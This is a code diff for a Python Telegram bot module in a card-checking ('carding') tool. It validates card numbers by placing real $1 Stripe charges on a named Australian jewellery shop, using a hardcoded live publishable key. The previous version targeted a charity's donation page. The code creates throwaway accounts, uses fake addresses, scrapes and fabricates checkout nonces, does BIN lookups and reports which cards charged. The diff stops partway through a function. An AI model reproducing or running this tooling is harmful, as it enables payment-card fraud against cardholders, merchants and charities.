@@ -1,4 +1,5 @@
-# BOT/gates/charge/stripe/scharge.py
+# BOT/gates/charge/scharge1.py
+# Stripe Charge 1$ - Compatible with WAYNE Bot Structure
 
 import json
 import asyncio
@@ -7,28 +8,33 @@ import time
 import httpx
 import random
 import string
-import logging
-from datetime import datetime
+from datetime import datetime, timedelta
 from pyrogram import Client, filters
 from pyrogram.types import Message
 import html
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.start import load_users, save_users
 
-# Import credit system and charge processor
+# Import from Admins module for command status
 try:
-    from BOT.gc.credit import charge_processor, get_user_credits
-    CREDIT_SYSTEM_AVAILABLE = True
+    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
 except ImportError:
-    CREDIT_SYSTEM_AVAILABLE = False
-    print("⚠️ Credit system not available - using fallback")
+    def is_command_disabled(command_name: str) -> bool:
+        return False
+
+    def get_command_offline_message(command_name: str) -> str:
+        return "Command is temporarily disabled."
+
+# Import universal charge processor
+try:
+    from BOT.gc.credit import charge_processor
+except ImportError:
+    charge_processor = None
 
 # Custom logger with emoji formatting
 class EmojiLogger:
     def __init__(self):
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.WARNING)
-        self.logger.propagate = False
+        pass
 
     def info(self, message):
         print(f"🔹 {message}")
@@ -63,14 +69,11 @@ class EmojiLogger:
     def user(self, message):
         print(f"👤 {message}")
 
+    def response_debug(self, message):
+        print(f"📄 {message}")
+
 # Create global logger instance
 logger = EmojiLogger()
-
-# Suppress other loggers
-logging.getLogger("pyrogram").setLevel(logging.ERROR)
-logging.getLogger("httpx").setLevel(logging.ERROR)
-logging.getLogger("httpcore").setLevel(logging.ERROR)
-logging.getLogger("asyncio").setLevel(logging.ERROR)
 
 def load_owner_id():
     try:
@@ -89,13 +92,17 @@ def get_user_plan(user_id):
 
 def is_user_banned(user_id):
     try:
+        if not os.path.exists("DATA/banned_users.txt"):
+            return False
+
         with open("DATA/banned_users.txt", "r") as f:
             banned_users = f.read().splitlines()
+
         return str(user_id) in banned_users
     except:
         return False
 
-def check_cooldown(user_id, command_type="xc"):
+def check_cooldown(user_id, command_type="xo"):
     """Check cooldown for user - SKIP FOR OWNER"""
     # Get owner ID
     owner_id = load_owner_id()
@@ -133,7 +140,9 @@ def check_cooldown(user_id, command_type="xc"):
 
     return True, 0
 
-class StripeChargeChecker:
+import os
+
+class StripeCharge1Checker:
     def __init__(self):
         # Modern browser user agents
         self.user_agents = [
@@ -143,96 +152,75 @@ class StripeChargeChecker:
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
         ]
         self.user_agent = random.choice(self.user_agents)
         self.bin_cache = {}
         self.last_bin_request = 0
-        self.base_url = "https://www.beitsahourusa.org"
-        self.stripe_key = "pk_live_51HhefWFVQkom3lAfFiSCo1daFNqT2CegRXN4QedqlScZqZRP55JVTekqb4d68wMYUY4bfg8M9eJK8A3pou9EKdhW00QAVLLIdm"
+        self.base_url = "https://www.mscollection.com.au"
+        self.stripe_key = "pk_live_51LGMhXEwJOtowRbIGQx1dkHP47yjCXM8TTyQMx2UH4wJEU6aEodXrTXjTWWjd26W7dQqaBTNQkGFuQSzavNUhz7L00xwuviFao"
 
-        # Updated campaign details for Michigan Chapter
-        self.campaign_id = "292"
-        self.campaign_description = "Establishing Michigan Chapter"
-        self.campaign_path = "/campaigns/establishing-michigan-chapter/"
+        # Product URL for Test product ($1.00)
+        self.product_url = f"{self.base_url}/shop/women-jewellery/necklace-sets/test/"
 
-        self.bin_services = [
+        # Country code to name mapping
+        self.country_map = {
+            'US': 'United States', 'GB': 'United Kingdom', 'CA': 'Canada', 'AU': 'Australia',
+            'DE': 'Germany', 'FR': 'France', 'IT': 'Italy', 'ES': 'Spain', 'NL': 'Netherlands',
+            'JP': 'Japan', 'SG': 'Singapore', 'AE': 'United Arab Emirates', 'IN': 'India',
+            'BR': 'Brazil', 'MX': 'Mexico', 'TW': 'Taiwan', 'CN': 'China', 'HK': 'Hong Kong',
+            'KR': 'South Korea', 'RU': 'Russia', 'CH': 'Switzerland', 'SE': 'Sweden',
+            'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'BE': 'Belgium', 'AT': 'Austria',
+            'PT': 'Portugal', 'IE': 'Ireland', 'NZ': 'New Zealand', 'ZA': 'South Africa'
+        }
+
+        # Australian address data
+        self.au_addresses = [
             {
-                'url': 'https://lookup.binlist.net/{bin}',
-                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
-                'name': 'binlist.net',
-                'parser': self.parse_binlist_net
+                "first_name": "James", "last_name": "Smith", 
+                "address": "61 Joshua Crossway", "city": "Wagnerfort", 
+                "postcode": "2674", "phone": "9302082589",
+                "state": "NSW", "country": "AU"
             },
             {
-                'url': 'https://bins.antipublic.cc/bins/{bin}',
-                'headers': {'User-Agent': self.user_agent},
-                'name': 'antipublic.cc',
-                'parser': self.parse_antipublic
+                "first_name": "Emma", "last_name": "Johnson", 
+                "address": "123 George Street", "city": "Sydney", 
+                "postcode": "2000", "phone": "0291234567",
+                "state": "NSW", "country": "AU"
+            },
+            {
+                "first_name": "Thomas", "last_name": "Williams", 
+                "address": "456 Collins Street", "city": "Melbourne", 
+                "postcode": "3000", "phone": "0398765432",
+                "state": "VIC", "country": "AU"
+            },
+            {
+                "first_name": "Sarah", "last_name": "Brown", 
+                "address": "78 Queen Street", "city": "Brisbane", 
+                "postcode": "4000", "phone": "0734567890",
+                "state": "QLD", "country": "AU"
+            },
+            {
+                "first_name": "Michael", "last_name": "Jones", 
+                "address": "89 King William Street", "city": "Adelaide", 
+                "postcode": "5000", "phone": "0887654321",
+                "state": "SA", "country": "AU"
             }
         ]
 
-        # Generate random browser fingerprints
-        self.generate_browser_fingerprint()
-
-    def generate_browser_fingerprint(self):
-        """Generate realistic browser fingerprints to bypass detection"""
-        # Screen resolutions
-        self.screen_resolutions = [
-            "1920x1080", "1366x768", "1536x864", "1440x900", 
-            "1280x720", "1600x900", "2560x1440", "3840x2160"
+        # 3D Secure and deferred payment patterns
+        self.secure_required_patterns = [
+            r'#wc-stripe-confirm-pi:',
+            r'pi_[a-zA-Z0-9]+_secret_',
+            r'requires_action',
+            r'requires_confirmation',
+            r'authentication_required',
+            r'3ds',
+            r'3d_secure',
+            r'confirm-pi',
+            r'deferred',
+            r'pending'
         ]
-
-        # Timezones
-        self.timezones = [
-            "America/New_York", "America/Chicago", "America/Denver", 
-            "America/Los_Angeles", "Europe/London", "Europe/Paris",
-            "Asia/Tokyo", "Australia/Sydney"
-        ]
-
-        # Languages
-        self.languages = [
-            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
-            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
-        ]
-
-        # Platform
-        if "Windows" in self.user_agent:
-            self.platform = "Win32"
-            self.sec_ch_ua_platform = '"Windows"'
-        elif "Macintosh" in self.user_agent:
-            self.platform = "MacIntel"
-            self.sec_ch_ua_platform = '"macOS"'
-        elif "Linux" in self.user_agent:
-            self.platform = "Linux x86_64"
-            self.sec_ch_ua_platform = '"Linux"'
-        elif "iPhone" in self.user_agent or "iPad" in self.user_agent:
-            self.platform = "iPhone"
-            self.sec_ch_ua_platform = '"iOS"'
-        elif "Android" in self.user_agent:
-            self.platform = "Linux armv8l"
-            self.sec_ch_ua_platform = '"Android"'
-        else:
-            self.platform = "Win32"
-            self.sec_ch_ua_platform = '"Windows"'
-
-        # Randomize other fingerprint elements
-        self.screen_resolution = random.choice(self.screen_resolutions)
-        self.timezone = random.choice(self.timezones)
-        self.accept_language = random.choice(self.languages)
-        self.connection_type = random.choice(["keep-alive", "close"])
-
-        # Generate Sec-CH-UA headers based on Chrome version
-        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
-        if chrome_version:
-            version = chrome_version.group(1)
-            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
-        else:
-            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'
-
-        # Generate Sec-CH-UA-Mobile
-        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"
 
     def get_country_emoji(self, country_code):
         """Hardcoded country emoji mapping"""
@@ -244,99 +232,32 @@ class StripeChargeChecker:
             'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
             'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
             'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
-            'EG': '🇪🇬'
+            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿'
         }
         return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
 
     def get_base_headers(self):
-        """Get undetectable base headers"""
+        """Get base headers mimicking browser"""
         return {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Accept-Language': self.accept_language,
-            'Cache-Control': 'max-age=0',
-            'Connection': self.connection_type,
+            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive',
             'DNT': '1',
-            'Sec-CH-UA': self.sec_ch_ua,
-            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
-            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
+            'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+            'Sec-CH-UA-Mobile': '?0',
+            'Sec-CH-UA-Platform': '"Windows"',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-Site': 'none',
             'Sec-Fetch-User': '?1',
             'Upgrade-Insecure-Requests': '1',
-            'User-Agent': self.user_agent,
-            'Viewport-Width': self.screen_resolution.split('x')[0],
-            'Width': self.screen_resolution.split('x')[0]
-        }
-
-    def parse_binlist_net(self, data):
-        scheme = data.get('scheme', 'N/A').upper()
-        if scheme == 'N/A':
-            scheme = data.get('brand', 'N/A').upper()
-
-        card_type = data.get('type', 'N/A').upper()
-        brand = data.get('brand', 'N/A')
-        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
-        country_name = data.get('country', {}).get('name', 'N/A')
-        country_code = data.get('country', {}).get('alpha2', 'N/A')
-
-        if country_name:
-            country_name = country_name.replace('(the)', '').strip().upper()
-
-        brand_display = brand.upper() if brand != 'N/A' else 'N/A'
-
-        # Get flag emoji
-        flag_emoji = self.get_country_emoji(country_code)
-
-        return {
-            'scheme': scheme,
-            'type': card_type,
-            'brand': brand_display,
-            'bank': bank_name,
-            'country': country_name,
-            'country_code': country_code,
-            'emoji': flag_emoji
-        }
-
-    def parse_antipublic(self, data):
-        if isinstance(data, str):
-            try:
-                data = json.loads(data)
-            except json.JSONDecodeError:
-                return {
-                    'scheme': 'N/A',
-                    'type': 'N/A',
-                    'brand': 'N/A',
-                    'bank': 'N/A',
-                    'country': 'N/A',
-                    'country_code': 'N/A',
-                    'emoji': '🏳️'
-                }
-
-        country_code = data.get('country', 'N/A')
-        country_name = data.get('country_name', country_code)
-        flag_emoji = data.get('country_flag', '🏳️')
-
-        if country_name:
-            country_name = country_name.replace('(the)', '').strip().upper()
-
-        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
-            if country_code != 'N/A' and len(country_code) == 2:
-                flag_emoji = self.get_country_emoji(country_code)
-
-        return {
-            'scheme': data.get('brand', 'N/A').upper(),
-            'type': data.get('type', 'N/A').upper(),
-            'brand': data.get('brand', 'N/A').upper(),
-            'bank': data.get('bank', 'N/A').upper(),
-            'country': country_name,
-            'country_code': country_code,
-            'emoji': flag_emoji
+            'User-Agent': self.user_agent
         }
 
     async def get_bin_info(self, cc):
-        """Get BIN information with proper flag handling"""
+        """Get BIN information"""
         if not cc or len(cc) < 6:
             return {
                 'scheme': 'N/A',
@@ -350,15 +271,40 @@ class StripeChargeChecker:
 
         bin_number = cc[:6]
 
-        # Check cache first
         if bin_number in self.bin_cache:
             return self.bin_cache[bin_number]
 
-        # Rate limiting
         now = time.time()
         if now - self.last_bin_request < 1.0:
             await asyncio.sleep(1.0)
         self.last_bin_request = time.time()
+
+        try:
+            url = f"https://bins.antipublic.cc/bins/{bin_number}"
+            headers = {'User-Agent': self.user_agent}
+
+            async with httpx.AsyncClient(timeout=10.0) as client:
+                response = await client.get(url, headers=headers)
+
+                if response.status_code == 200:
+                    data = response.json()
+                    country_code = data.get('country', 'N/A')
+                    country_name = self.country_map.get(country_code, 'N/A')
+                    flag_emoji = self.get_country_emoji(country_code)
+
+                    result = {
+                        'scheme': data.get('brand', 'N/A').upper(),
+                        'type': data.get('type', 'N/A').upper(),
+                        'brand': data.get('brand', 'N/A'),
+                        'bank': data.get('bank', 'N/A'),
+                        'country': country_name,
+                        'country_code': country_code,
+                        'emoji': flag_emoji
+                    }
+                    self.bin_cache[bin_number] = result
+                    return result
+        except Exception as e:
+            logger.warning(f"BIN lookup failed: {e}")
 
         default_response = {
             'scheme': 'N/A',
@@ -369,54 +315,61 @@ class StripeChargeChecker:
             'country_code': 'N/A',
             'emoji': '🏳️'
         }
-
-        # Try antipublic.cc first
-        try:
-            url = f"https://bins.antipublic.cc/bins/{bin_number}"
-            headers = {'User-Agent': self.user_agent}
-
-            async with httpx.AsyncClient(timeout=10.0) as client:
-                response = await client.get(url, headers=headers)
-
-                if response.status_code == 200:
-                    data = response.json()
-
-                    if "detail" in data and "not found" in data["detail"].lower():
-                        logger.warning(f"BIN {bin_number} not found in antipublic.cc")
-                    else:
-                        result = self.parse_antipublic(data)
-                        self.bin_cache[bin_number] = result
-                        return result
-        except Exception as e:
-            logger.warning(f"antipublic.cc failed: {e}")
-
-        # Fallback to binlist.net
-        for service in self.bin_services:
-            if service['name'] == 'binlist.net':
-                try:
-                    url = service['url'].format(bin=bin_number)
-                    headers = service['headers']
-
-                    async with httpx.AsyncClient(timeout=10.0) as client:
-                        response = await client.get(url, headers=headers)
-
-                        if response.status_code == 200:
-                            data = response.json()
-                            result = service['parser'](data)
-
-                            if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
-                                better_flag = self.get_country_emoji(result['country_code'])
-                                result['emoji'] = better_flag
-
-                            self.bin_cache[bin_number] = result
-                            return result
-                except Exception as e:
-                    logger.warning(f"binlist.net failed: {e}")
-                    continue
-
-        # If all fail, return default
         self.bin_cache[bin_number] = default_response
         return default_response
+
+    def extract_error_from_html(self, html_content):
+        """Extract error message from HTML response"""
+        if not html_content:
+            return "Payment declined"
+        
+        # Pattern for woocommerce error
+        pattern = r'<li>\s*There was an error processing the payment:\s*(.*?)\s*<\/li>'
+        match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
+        if match:
+            error_text = match.group(1).strip()
+            # Remove any remaining HTML tags
+            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
+            return error_text
+        
+        # Alternative pattern
+        pattern2 = r'woocommerce-error[^>]*>.*?<li>(.*?)<\/li>'
+        match2 = re.search(pattern2, html_content, re.IGNORECASE | re.DOTALL)
+        if match2:
+            error_text = match2.group(1).strip()
+            error_text = re.sub(r'<[^>]+>', '', error_text).strip()
+            # Remove prefix if present
+            if "there was an error processing the payment:" in error_text.lower():
+                error_text = error_text.split(":", 1)[-1].strip()
+            return error_text
+        
+        return "Payment declined"
+
+    def is_secure_required_response(self, response_data):
+        """Check if the response indicates 3D Secure or deferred payment is required"""
+        try:
+            if isinstance(response_data, dict):
+                # Check redirect URL for patterns
+                redirect_url = response_data.get('redirect', '').lower()
+
+                for pattern in self.secure_required_patterns:
+                    if re.search(pattern, redirect_url):
+                        logger.warning(f"Secure pattern detected in redirect: {pattern}")
+                        return True
+
+                # Check for other indicators
+                if 'requires_action' in response_data or 'requires_confirmation' in response_data:
+                    return True
+
+                # Check for pi_ and _secret patterns in any field
+                response_str = str(response_data).lower()
+                if 'pi_' in response_str and '_secret_' in response_str:
+                    return True
+
+        except Exception as e:
+            logger.warning(f"Error checking secure response: {e}")
+
+        return False
 
     async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
         if bin_info is None:
@@ -424,64 +377,33 @@ class StripeChargeChecker:
 
         user_id = user_data.get("user_id", "Unknown")
         first_name = html.escape(user_data.get("first_name", "User"))
-        badge = user_data.get("plan", {}).get("badge", "🎭")
+        badge = user_data.get("plan", {}).get("badge", "🧿")
 
-        # Determine status based on message content (like in response.py)
-        raw_message = str(message).lower()
-
-        # Check for success patterns
-        success_patterns = [
-            "successfully charged",
-            "thank you",
-            "order placed",
-            "approved",
-            "success"
-        ]
-
-        # Check for 3D Secure patterns
-        three_d_patterns = [
-            "3d secure",
-            "3ds",
-            "requires_action",
-            "authentication_required"
-        ]
-
-        # Check for decline patterns
-        decline_patterns = [
-            "declined",
-            "failed",
-            "error",
-            "unsupported",
-            "invalid"
-        ]
-
-        status_flag = "Declined ❌"
-        status_emoji = "❌"
-
-        if any(pattern in raw_message for pattern in success_patterns):
-            status_flag = "Charged 💎"
-            status_emoji = "💎"
-        elif "3d secure❎" in raw_message.lower():
-            status_flag = "3D Secure ❎"
-            status_emoji = "❎"
-        elif any(pattern in raw_message for pattern in three_d_patterns):
-            status_flag = "3D Secure ❎"
-            status_emoji = "❎"
-        elif "approved" in status.lower():
-            status_flag = "Approved ❎"
-            status_emoji = "❎"
+        # Check if this is a 3D Secure case
+        if any(pattern in str(message).lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action", "wc-stripe-confirm-pi"]):
+            status_emoji = "❌"
+            status_text = "DECLINED"
+            message_display = "3D SECURE❎"
+        elif status == "APPROVED":
+            status_emoji = "✅"
+            status_text = "APPROVED"
+            message_display = "Successfully Charged 1$"
+        else:
+            status_emoji = "❌"
+            status_text = "DECLINED"
+            # Use the message directly as extracted
+            message_display = message if message else "Payment declined"
 
         clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
         user_display = f"「{badge}」{clean_name}"
         bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'
 
-        # Format response with /xc command name
-        response = f"""<b>「$cmd → /xc」| <b>WAYNE</b> </b>
+        response = f"""<b>「$cmd → /xo」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Charge 10$ ♻️
-<b>[•] Status-</b> <code>{status_flag}</code>
-<b>[•] Response-</b> <code>{message}</code>
+<b>[•] Gateway -</b> Stripe Charge 1$
+<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
+<b>[•] Response-</b> <code>{message_display}</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Bin:</b> <code>{cc[:6]}</code>  
 <b>[+] Info:</b> <code>{bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}</code>
@@ -496,10 +418,10 @@ class StripeChargeChecker:
         return response
 
     def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
-        return f"""<b>「$cmd → /xc」| <b>WAYNE</b> </b>
+        return f"""<b>「$cmd → /xo」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Charge 10$ ♻️
+<b>[•] Gateway -</b> Stripe Charge 1$
 <b>[•] Status-</b> Processing... ⏳
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Plan:</b> {user_plan}
@@ -507,117 +429,338 @@ class StripeChargeChecker:
 ━━━━━━━━━━━━━━━
 <b>Checking card... Please wait.</b>"""
 
-    async def get_form_tokens(self, client):
-        """Get form tokens from Michigan Chapter donation page"""
-        try:
-            logger.step(1, 4, "Loading Michigan Chapter donation page...")
+    async def human_delay(self, min_delay=0.2, max_delay=0.5):
+        """Simulate human delay between actions - REDUCED for speed"""
+        delay = random.uniform(min_delay, max_delay)
+        await asyncio.sleep(delay)
 
-            response = await client.get(
-                f"{self.base_url}{self.campaign_path}",
-                headers=self.get_base_headers()
+    async def make_request(self, client, method, url, **kwargs):
+        """Make request without unnecessary delays - OPTIMIZED"""
+        headers = kwargs.get('headers', {}).copy()
+        headers.update({
+            'User-Agent': self.user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Cache-Control': 'no-cache',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate', 
+            'Sec-Fetch-Site': 'none',
+            'Upgrade-Insecure-Requests': '1'
+        })
+        kwargs['headers'] = headers
+
+        try:
+            response = await client.request(method, url, **kwargs)
+            return response
+        except Exception as e:
+            logger.error(f"Request error: {str(e)}")
+            raise e
+
+    async def initialize_session(self, client):
+        """Initialize session with proper cookies"""
+        try:
+            logger.step(1, 6, "Initializing session...")
+
+            response = await self.make_request(
+                client, 'GET', f"{self.base_url}/"
+            )
+
+            if response.status_code == 200:
+                logger.success("Session initialized successfully")
+                return True
+            else:
+                logger.error(f"Failed with status {response.status_code}")
+                return False
+
+        except Exception as e:
+            logger.error(f"Session initialization error: {str(e)}")
+            return False
+
+    async def register_account(self, client):
+        """Register a new account with random email"""
+        try:
+            logger.step(2, 6, "Registering new account...")
+
+            # Generate random email
+            random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+            email = f"{random_string}@gmail.com"
+
+            # Get registration page first to extract nonce
+            reg_response = await self.make_request(
+                client, 'GET', f"{self.base_url}/my-account/"
+            )
+
+            if reg_response.status_code != 200:
+                return False, None, f"Failed to load registration page: {reg_response.status_code}"
+
+            # Extract registration nonce
+            nonce = None
+            nonce_patterns = [
+                r'woocommerce-register-nonce" value="([a-f0-9]+)"',
+                r'register-nonce["\']?\s*value=["\']?([a-f0-9]+)',
+            ]
+
+            for pattern in nonce_patterns:
+                match = re.search(pattern, reg_response.text)
+                if match:
+                    nonce = match.group(1)
+                    break
+
+            if not nonce:
+                return False, None, "Failed to extract registration nonce"
+
+            # Prepare registration data
+            reg_data = {
+                'email': email,
+                'wc_order_attribution_source_type': 'typein',
+                'wc_order_attribution_referrer': '(none)',
+                'wc_order_attribution_utm_campaign': '(none)',
+                'wc_order_attribution_utm_source': '(direct)',
+                'wc_order_attribution_utm_medium': '(none)',
+                'wc_order_attribution_utm_content': '(none)',
+                'wc_order_attribution_utm_id': '(none)',
+                'wc_order_attribution_utm_term': '(none)',
+                'wc_order_attribution_utm_source_platform': '(none)',
+                'wc_order_attribution_utm_creative_format': '(none)',
+                'wc_order_attribution_utm_marketing_tactic': '(none)',
+                'wc_order_attribution_session_entry': f'{self.base_url}/my-account/',
+                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'wc_order_attribution_session_pages': '1',
+                'wc_order_attribution_session_count': '1',
+                'wc_order_attribution_user_agent': self.user_agent,
+                'woocommerce-register-nonce': nonce,
+                '_wp_http_referer': '/my-account/',
+                'register': 'Register'
+            }
+
+            reg_headers = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": self.base_url,
+                "Referer": f"{self.base_url}/my-account/",
+            }
+
+            response = await self.make_request(
+                client, 'POST', f"{self.base_url}/my-account/",
+                headers=reg_headers, data=reg_data
+            )
+
+            if response.status_code == 302 or response.status_code == 200:
+                logger.success(f"Account registered successfully: {email}")
+                return True, email, None
+            else:
+                return False, None, f"Registration failed: {response.status_code}"
+
+        except Exception as e:
+            logger.error(f"Registration error: {str(e)}")
+            return False, None, f"Registration error: {str(e)}"
+
+    async def add_product_to_cart(self, client):
+        """Add Test product to cart"""
+        try:
+            logger.step(3, 6, "Adding product to cart...")
+
+            # Load product page
+            response = await self.make_request(
+                client, 'GET', self.product_url
+            )
+
+            if response.status_code not in [200, 202]:
+                return False, f"Failed to load product page: {response.status_code}"
+
+            # Extract product ID
+            product_id = None
+
+            # Try multiple patterns for product ID
+            id_patterns = [
+                r'add-to-cart" value="(\d+)"',
+                r'data-product_id="(\d+)"',
+                r'product_id["\']?\s*:\s*["\']?(\d+)',
+            ]
+
+            for pattern in id_patterns:
+                match = re.search(pattern, response.text)
+                if match:
+                    product_id = match.group(1)
+                    break
+
+            if not product_id:
+                product_id = "3845"  # From the request logs
+                logger.warning(f"Using fallback product ID: {product_id}")
+
+            # Add to cart using multipart form data
+            boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
+            
+            cart_data = (
+                f'------WebKitFormBoundary{boundary}\r\n'
+                f'Content-Disposition: form-data; name="quantity"\r\n\r\n'
+                f'1\r\n'
+                f'------WebKitFormBoundary{boundary}\r\n'
+                f'Content-Disposition: form-data; name="add-to-cart"\r\n\r\n'
+                f'{product_id}\r\n'
+                f'------WebKitFormBoundary{boundary}--\r\n'
+            )
+
+            add_headers = {
+                "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{boundary}",
+                "Origin": self.base_url,
+                "Referer": self.product_url,
+            }
+
+            response = await self.make_request(
+                client, 'POST', self.product_url, 
+                headers=add_headers, content=cart_data.encode()
+            )
+
+            if response.status_code in [200, 202, 302]:
+                logger.success("Product added to cart successfully")
+                return True, None
+            else:
+                return False, f"Add to cart failed: {response.status_code}"
+
+        except Exception as e:
+            logger.error(f"Add to cart error: {str(e)}")
+            return False, f"Add to cart error: {str(e)}"
+
+    async def get_checkout_tokens(self, client):
+        """Get checkout page tokens"""
+        try:
+            logger.step(4, 6, "Loading checkout page...")
+
+            # Go to checkout directly (skip cart page for speed)
+            response = await self.make_request(
+                client, 'GET', f"{self.base_url}/checkout/"
             )
 
             if response.status_code != 200:
-                return None, f"Failed to load page: {response.status_code}"
+                return None, f"Failed to load checkout page: {response.status_code}"
 
-            html_text = response.text
+            html = response.text
 
             tokens = {}
 
-            # Extract form ID
-            form_id_match = re.search(r'name="charitable_form_id" value="([^"]+)"', html_text)
-            if form_id_match:
-                tokens['charitable_form_id'] = form_id_match.group(1)
-                logger.success(f"Form ID: {tokens['charitable_form_id']}")
-            else:
-                return None, "No form ID found"
+            # Extract checkout nonce
+            nonce_patterns = [
+                r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]{10})"',
+                r'woocommerce-process-checkout-nonce["\']?\s*value=["\']?([a-f0-9]{10})',
+                r'checkout_nonce["\']?\s*:\s*["\']?([a-f0-9]{10})',
+            ]
 
-            # Extract donation nonce
-            nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', html_text)
-            if nonce_match:
-                tokens['donation_nonce'] = nonce_match.group(1)
-                logger.success(f"Donation nonce: {tokens['donation_nonce']}")
-            else:
-                return None, "No donation nonce found"
+            for pattern in nonce_patterns:
+                match = re.search(pattern, html, re.IGNORECASE)
+                if match:
+                    tokens['checkout_nonce'] = match.group(1)
+                    break
 
-            # Use the updated campaign ID for Michigan Chapter
-            tokens['campaign_id'] = self.campaign_id
-            logger.success(f"Campaign ID: {tokens['campaign_id']} (Michigan Chapter)")
+            # Extract wlptnonce for pickup time
+            wlpt_patterns = [
+                r'_wlptnonce["\']?\s*value=["\']?([a-f0-9]{10})',
+            ]
 
-            # Extract other required fields
-            wp_referer_match = re.search(r'name="_wp_http_referer" value="([^"]+)"', html_text)
-            tokens['_wp_http_referer'] = wp_referer_match.group(1) if wp_referer_match else self.campaign_path
+            for pattern in wlpt_patterns:
+                match = re.search(pattern, html, re.IGNORECASE)
+                if match:
+                    tokens['wlptnonce'] = match.group(1)
+                    break
 
+            # Fallback
+            if 'checkout_nonce' not in tokens:
+                tokens['checkout_nonce'] = ''.join(random.choices('abcdef0123456789', k=10))
+
+            if 'wlptnonce' not in tokens:
+                tokens['wlptnonce'] = ''.join(random.choices('abcdef0123456789', k=10))
+
+            logger.success("All tokens extracted successfully")
             return tokens, None
 
         except Exception as e:
-            logger.error(f"Token error: {str(e)}")
-            return None, f"Token error: {str(e)}"
+            logger.error(f"Token extraction error: {str(e)}")
